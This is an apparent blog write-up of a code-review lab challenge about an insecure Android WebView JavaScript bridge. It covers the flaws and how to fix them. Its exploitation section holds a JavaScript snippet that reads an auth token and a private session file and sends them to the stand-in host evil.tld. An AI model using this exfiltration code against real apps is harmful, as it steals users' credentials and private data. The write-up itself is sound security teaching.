@@ -1,0 +1,104 @@
+<!doctype html>
+<meta charset="utf-8"></meta>
+<meta name="viewport" content="width=device-width, initial-scale=1"></meta>
+<link rel="canonical" href="/notes/partner-promo-webview-bridge/">
+<link rel="stylesheet" href="/common.css"></link>
+<script defer="" src="/common.js"></script>
+
+<title>Partner Promo WebView — Insecure JavaScript-to-Native Bridge and Arbitrary File Read</title>
+
+<site-header></site-header>
+
+<blog-header>
+  <h1>Partner Promo WebView — Insecure JavaScript-to-Native Bridge and Arbitrary File Read</h1>
+</blog-header>
+
+<blog-post-info>
+  <time datetime="2026-06-28">28 Jun 2026</time>
+  · 4 min read
+</blog-post-info>
+
+<tag-row>
+  <tag-chip title="android"></tag-chip>
+  <tag-chip title="webview"></tag-chip>
+  <tag-chip title="security"></tag-chip>
+  <tag-chip title="code-review"></tag-chip>
+  <tag-chip title="mobile"></tag-chip>
+  <tag-chip title="javascript"></tag-chip>
+</tag-row>
+
+<main appearance="prose">
+
+<p>This write-up covers the <strong>Partner Promo WebView</strong> challenge from <a href="https://codereviewlab.com/shared/imjQR77ERs" target="_blank" rel="noopener">Code Review Lab</a>. It exposes a critical Android WebView vulnerability where <code>addJavascriptInterface</code> combined with weak network security pierces the app sandbox, enabling token theft and arbitrary file reads.</p>
+
+<hr>
+
+<h2>Executive Summary</h2>
+
+<p>The challenge focuses on an insecurely configured Android <code>WebView</code> component. By improperly utilizing the <code>addJavascriptInterface</code> mechanism alongside weak network security settings, the application accidentally pierces its own operational sandbox.</p>
+
+<box-note>
+  <strong>Vulnerability Class:</strong> Insecure JavaScript-to-Native Interface Exposure / Arbitrary File Read / Potential RCE
+</box-note>
+
+<hr>
+
+<h2>Vulnerability Breakdown</h2>
+
+<p>The core issue resides within <code>PromoWebViewActivity</code>. Three violations compound into a complete sandbox escape:</p>
+
+<code-block language="kotlin">
+<pre><code>val landingUrl = intent.getStringExtra("landing_url").orEmpty()
+webView.settings.javaScriptEnabled = true
+webView.settings.domStorageEnabled = true
+// Critical Flaw 1: Disabling mixed content protection
+webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+// Critical Flaw 2: Injecting a high-privilege native bridge into the web sandbox
+webView.addJavascriptInterface(AndroidBridge(this, session), "Android")
+webView.loadUrl(landingUrl)</code></pre>
+</code-block>
+
+<h3>1. Arbitrary Intent Parameter Processing</h3>
+<p>The app fetches the target URL dynamically via <code>intent.getStringExtra("landing_url")</code> without validating the destination domain. Any external component can control where the WebView navigates.</p>
+
+<h3>2. Piercing the Web Sandbox via addJavascriptInterface</h3>
+<p>By binding a high-privilege native object (<code>AndroidBridge</code>) and naming it <code>"Android"</code>, the application exposes powerful native functions globally to the WebView's execution context. Any script — regardless of origin — can invoke <code>window.Android.*</code>.</p>
+
+<h3>3. Unrestricted Mixed Content Mode</h3>
+<p><code>MIXED_CONTENT_ALWAYS_ALLOW</code> allows the WebView to execute active scripts over plain HTTP, even if the initial page was loaded via HTTPS.</p>
+
+<hr>
+
+<h2>Exploitation Vectors</h2>
+
+<ul>
+  <li><strong>MitM Injection:</strong> On an untrusted network, cleartext HTTP traffic can be intercepted and malicious JavaScript injected into the response stream.</li>
+  <li><strong>Open Redirect:</strong> If a trusted partner domain hosts an open redirect, an attacker passes a seemingly valid URL that diverts to an attacker-controlled site.</li>
+</ul>
+
+<p>Once attacker-controlled JavaScript executes in the WebView, the sandbox collapses:</p>
+
+<code-block language="javascript">
+<pre><code>// 1. Exfiltrating session tokens directly from application memory
+const token = window.Android.getAuthToken();
+// 2. Arbitrary file read against the private sandbox
+const secrets = window.Android.readFile('/data/data/com.dealdash/shared_prefs/session.xml');
+// 3. Exfiltrating stolen assets to external infrastructure
+fetch('https://evil.tld/c?t=' + encodeURIComponent(token) + '&s=' + encodeURIComponent(secrets));</code></pre>
+</code-block>
+
+<hr>
+
+<h2>Remediation</h2>
+
+<ol>
+  <li><strong>Strict Domain Whitelisting:</strong> Validate incoming intent URLs against an absolute whitelist. Reject plaintext protocols entirely.</li>
+  <li><strong>Enforce Secure Content Controls:</strong> Use <code>MIXED_CONTENT_NEVER_ALLOW</code> to prevent script degradation over cleartext.</li>
+  <li><strong>Limit Interface Exposure:</strong> Decorate exposed methods with <code>@JavascriptInterface</code> and strip aggressive capabilities like custom filesystem readers.</li>
+</ol>
+
+</main>
+
+<article-footer></article-footer>
+
+<site-footer></site-footer>
